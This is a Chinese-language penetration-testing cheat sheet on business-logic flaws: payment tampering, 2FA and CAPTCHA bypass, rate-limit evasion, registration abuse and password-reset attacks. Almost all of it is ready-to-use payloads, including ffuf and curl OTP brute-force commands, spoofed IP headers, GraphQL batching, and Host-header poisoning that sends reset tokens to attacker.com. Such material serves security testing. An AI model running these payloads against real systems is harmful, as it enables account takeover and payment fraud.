# 业务逻辑缺陷模式速查

## 1. 支付/交易逻辑缺陷

### 1.1 关键参数篡改

| 参数类型 | 篡改方向 | 预期效果 |
|----------|----------|----------|
| `success` / `status` | `false` -> `true` | 跳过实际支付 |
| `callback` / `return_url` | 替换为攻击者 URL | 劫持支付回调 |
| `total_amount` / `price` | 改小/改零/改负 | 低价购买或反向充值 |

### 1.2 支付 URL 与回调

- 响应中 `example.com/payment/MD5HASH` 格式 URL：提取后新窗口打开，测试能否跳过扣款
- 修改 MD5HASH 部分以复用/伪造支付凭证

### 1.3 Cookie、响应与会话篡改

```http
# Cookie 篡改
Cookie: payment_status=completed; order_total=0

# 响应篡改 — 拦截后修改
{"status":"failed"} -> {"status":"success"}

# 会话令牌 — 重放成功支付回调以重复到账
```

---

## 2. 2FA/MFA 绕过

### 2.1 流程跳过

```http
# 直接访问受保护端点，伪造 Referer
GET /dashboard HTTP/1.1
Referer: https://target.com/2fa-verify
```

### 2.2 令牌滥用

| 手法 | 描述 |
|------|------|
| 令牌复用 | 已使用的 OTP 重新提交 |
| 跨账户 | 用自己账户的 OTP 验证其他账户 |
| 响应泄露 | API 响应中直接返回了 OTP |
| 邮箱验证链接 | 注册确认链接可能绕过 2FA |

### 2.3 会话操纵

同时开启攻击者和受害者的会话，完成攻击者的 2FA 验证后，尝试用已验证状态访问受害者流程。

### 2.4 密码重置绕过 2FA

注册 -> 启用 2FA -> 触发密码重置 -> 用新密码登录，观察是否跳过 2FA。

### 2.5 OTP 暴力破解

```bash
ffuf -w <(seq -w 000000 999999) -u https://target/api/verify-2fa \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"FUZZ"}' -mc 200
```

- 即使触发 429/401，有效 OTP 可能仍返回 200——不要过早停止
- 重发验证码可重置速率限制计数器
- 慢速暴力可绕过流速限制

### 2.6 其他手法

- "记住设备" Cookie 预测：`remember_2fa=base64(user_id+timestamp)`
- IP 伪装：`X-Forwarded-For: <victim_ip>`
- 旧版子域名/API（`/v1/login`）可能未实施 2FA
- CSRF/Clickjacking 禁用 2FA 设置
- 备份码若存在 CORS 错误或 XSS 可被窃取

---

## 3. CAPTCHA 绕过

### 3.1 参数操纵

| 手法 | 操作 |
|------|------|
| 删除参数 | 移除 `captcha` 字段 |
| 空值提交 | `captcha=` 或 `captcha=null` |
| 更换方法 | POST -> GET，form-data -> JSON |
| 旧值复用 | 重复使用已成功的值 |
| 跨会话复用 | 同一值在不同 session 提交 |

### 3.2 值提取

```javascript
// 页面源码中的隐藏字段
document.querySelector('[name=captcha_hash]').value
// Cookie 中存储的答案
document.cookie  // captcha_answer=XXXX
```

### 3.3 自动识别

```bash
# Tesseract OCR
tesseract captcha.png stdout --psm 7 -c tessedit_char_whitelist=0123456789ABCDEFabcdef
```

- 数学运算型：正则提取表达式后计算
- 有限图片集：MD5 哈希建立映射表
- 音频验证码：语音转文字服务

---

## 4. 速率限制绕过

### 4.1 端点变体

```
/api/v3/login  ->  /api/v1/login | /Api/Login | /api/v3/login/ | /api/v3/login?dummy=1
```

### 4.2 空白字符注入

```
code=1234%00    code=1234%0a    code=1234%0d    code=1234%09    code=1234%20
email=victim@test.com%00    email=victim@test.com%0d%0a
```

### 4.3 IP 来源伪造

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
```

### 4.4 HTTP/2 多路复用

```bash
seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge -X POST \
  -H "Content-Type: application/json" \
  -d '{"code":"@"}' https://target/api/v2/verify &>/dev/null
```

限制器按 TCP 连接计数，而非 HTTP/2 stream 数量。

### 4.5 GraphQL 别名批量

```graphql
mutation bruteForceOTP {
  a: verify(code:"111111") { token }
  b: verify(code:"222222") { token }
  c: verify(code:"333333") { token }
}
```

单请求多 alias，限制器只计一次。

### 4.6 其他协议绕过

| 手法 | 原理 |
|------|------|
| REST 批量端点 | `/v2/batch` 接受请求数组，限制器仅计一次 |
| 滑动窗口定时 | 观察 `X-RateLimit-Reset`，在窗口边界两侧各发满额请求 |
| WebSocket 升级 | 升级后帧不作为独立 HTTP 请求计数 |
| gRPC 流式 | 单连接内发送多个请求 |
| CDN PoP 分片 | 各数据中心独立计数，通过代理池路由到不同 PoP |

```bash
# WebSocket 洪泛
seq -w 000000 000999 | websocat -n ws://target/api/verify-ws
```

---

## 5. 注册流程漏洞

### 5.1 重复注册绕过

| 手法 | Payload |
|------|---------|
| 大写变体 | `Victim@email.com` |
| 子地址 | `victim+1@gmail.com` |
| 点号 | `v.ictim@gmail.com` |
| 空白字符 | `victim@email.com%00` / `%20` |
| 尾部空格 | `victim@email.com ` |
| 双 @ | `victim@gmail.com@attacker.com` |
| Unicode | 同形字符或软连字符 `\u00AD` |

### 5.2 用户名枚举

- 错误消息/状态码差异
- 响应时间差异（已注册触发 DB 查询）
- 团队邀请流程泄露账户存在性

### 5.3 注册即重置（Upsert 覆盖）

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"email":"victim@example.com","password":"attacker_pwd"}
```

注册端点对已有邮箱执行 upsert 而非拒绝，无需令牌即可接管账户。

### 5.4 账户预劫持（Pre-Hijacking）

| 手法 | 攻击流程 |
|------|----------|
| 经典-联合合并 | 用受害者邮箱注册 -> 受害者 SSO 登录 -> 合并逻辑保留攻击者访问 |
| 未过期会话 | 创建账户保持会话 -> 受害者重置密码 -> 旧会话仍有效 |
| 木马标识符 | 添加二级邮箱/手机/IdP -> 受害者使用后 -> 攻击者通过木马标识符恢复 |
| 待确认变更 | 发起邮箱变更不确认 -> 受害者恢复 -> 攻击者完成变更接管 |
| 未验证 IdP | 通过不验证邮箱的 IdP 断言受害者邮箱 -> 服务未检查 `email_verified` |

### 5.5 OTP 多值走私

```bash
code=000000&code=123456
{"code":["000000","123456"]}
code=000000,123456
```

后端可能接受数组/多值并匹配其中任一。

---

## 6. 密码重置漏洞

### 6.1 Referrer 泄露令牌

点击重置链接后不修改密码，直接访问第三方链接 -> 检查 `Referer` 头中是否包含 token。

### 6.2 Host 头投毒

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

{"email":"victim@target.com"}
```

受害者收到的链接变为 `https://attacker.com/reset?token=TOKEN`。

### 6.3 邮箱参数污染

```http
email=victim@mail.com&email=attacker@mail.com
{"email":["victim@mail.com","attacker@mail.com"]}
email=victim@mail.com%0A%0Dcc:attacker@mail.com
email=victim@mail.com%0A%0Dbcc:attacker@mail.com
email=victim@mail.com,attacker@mail.com
email=victim@mail.com|attacker@mail.com
```

### 6.4 弱令牌分析

| 生成因素 | 风险 |
|----------|------|
| 时间戳 | 可预测窗口 |
| 用户 ID / 邮箱 | 已知信息参与生成 |
| UUID v1 | 含时间+MAC，可推算 |
| 纯数字 / 短序列 | 可暴力枚举 |
| 无过期 | 扩大攻击窗口 |

工具：Burp Sequencer 分析随机性，guidtool 分析 UUID。

### 6.5 用户名碰撞

注册 `"admin "` (尾部空格) -> 触发密码重置 -> 令牌发至攻击者邮箱 -> 重置 `admin` 密码。

### 6.6 IDOR 篡改

```http
POST /api/changepass HTTP/1.1
Content-Type: application/json

{"email":"victim@email.com","password":"new_password"}
```

### 6.7 会话轮换暴力

OTP 尝试次数按会话追踪时：每 N 次请求新会话 -> 重发重置获取新 OTP -> 随机猜测（OTP 随会话变化）。

### 6.8 后置检查

- 已过期令牌能否仍使用
- 重置成功后旧会话是否失效
- 待处理的邮箱/手机变更是否被清除
